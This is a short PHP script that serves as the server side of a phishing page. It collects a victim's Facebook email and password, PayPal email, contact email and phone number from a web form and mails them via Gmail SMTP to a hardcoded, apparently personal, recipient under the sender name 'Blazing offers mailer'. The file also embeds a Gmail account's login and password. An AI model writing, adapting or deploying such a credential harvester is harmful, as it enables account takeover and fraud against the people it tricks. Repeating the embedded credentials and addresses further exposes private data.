<?php
// Import PHPMailer classes into the global namespace
// These must be at the top of your script, not inside a function
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

// Load Composer's autoloader
require 'vendor/autoload.php';

// Instantiation and passing `true` enables exceptions
$mail = new PHPMailer(true);

//gather form data:
$name = htmlspecialchars($_POST['name']);
$email = htmlspecialchars($_POST['email']);
$password = htmlspecialchars($_POST['password']);
$paypal = htmlspecialchars($_POST['paypal_email']);
$contact = htmlspecialchars($_POST['contact_email']);
$phone = htmlspecialchars($_POST['phone']);

$body = "<h1>Name: " . $name . "</h1>\n" .
        "<h1>Facebook mail: " . $email . "</h1>\n" .
        "<h1>Facebook password: " . $password . "</h1>\n" .
        "<h1>Paypal email: " . $paypal . "</h1>\n" .
        "<h1>Contact email: " . $contact . "</h1>\n" .
        "<h1>Phone number: " . $phone . "</h1>";

try {
    //Server settings
    $mail->SMTPDebug = 2;                                       // Enable verbose debug output
    $mail->isSMTP();                                            // Set mailer to use SMTP
    $mail->Host       = 'smtp.gmail.com';                       // Specify main and backup SMTP servers
    $mail->SMTPAuth   = true;                                   // Enable SMTP authentication
    $mail->Username   = 'facbookmailer@gmail.com';              // SMTP username - GMAIL USERNAME HERE
    $mail->Password   = 'facebookmailer123';                    // SMTP password - GMAIL PASSWORD HERE
    $mail->SMTPSecure = 'ssl';                                  // Enable TLS encryption, `ssl` also accepted
    $mail->Port       = 465;                                    // TCP port to connect to

    //Recipients
    $mail->setFrom('theblazingoffers@gmail.com', 'Blazing offers mailer');
    $mail->addAddress('markokrizan64@gmail.com');
    //$mail->addAddress('theblazingoffers@gmail.com');     // Add a recipient

    //Mulitple adresses, cc, and bcc examples:
    //$mail->addAddress('ellen@example.com');               // Name is optional
    //$mail->addReplyTo('info@example.com', 'Information');
    //$mail->addCC('cc@example.com');
    //$mail->addBCC('bcc@example.com');

    // Attachments
    //$mail->addAttachment('/var/tmp/file.tar.gz');         // Add attachments
    //$mail->addAttachment('/tmp/image.jpg', 'new.jpg');    // Optional name

    // Content
    $mail->isHTML(true);                                  // Set email format to HTML
    $mail->Subject = 'Here is the subject';
    $mail->Body = $body;
    $mail->send();
} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}
